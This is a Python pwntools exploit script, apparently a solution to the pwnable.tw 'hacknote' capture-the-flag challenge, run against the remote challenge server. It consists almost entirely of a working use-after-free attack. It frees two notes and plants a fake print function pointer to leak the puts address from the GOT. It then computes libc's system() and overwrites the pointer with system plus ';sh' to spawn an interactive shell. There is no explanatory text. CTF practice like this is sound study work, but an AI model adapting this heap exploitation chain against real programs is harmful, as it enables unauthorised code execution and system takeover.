from pwn import *

elf = context.binary = ELF('hacknote')
libc = ELF('libc_32.so.6')

#p = process()
p = remote('chall.pwnable.tw', 10102)#nc chall.pwnable.tw 10102
#gdb.attach(p)

def new_node(size, data):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Note size :')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content :')
    p.sendline(data)
def delete_node(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())
def print_node(index):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())



PRINT_NODE = 0x804862b


new_node(0x70, b'A')
new_node(0x70, b'A')
delete_node(0)
delete_node(1)

new_node(8, p32(PRINT_NODE) + p32(elf.got['puts']))
print_node(0) # leak libc
leak = p.recv(4)
leak = int.from_bytes(leak, byteorder='little')
print('leak: {}'.format(hex(leak)))
libc.address = leak - libc.symbols['puts']
print('libc: {}'.format(hex(libc.address)))
delete_node(2)

payload = flat(
    libc.symbols['system'],
    b';sh\x00'
)
new_node(8, payload)
print_node(0) # trigger system


#print(payload)
#p.sendline(payload)
#print_node(0)
p.interactive()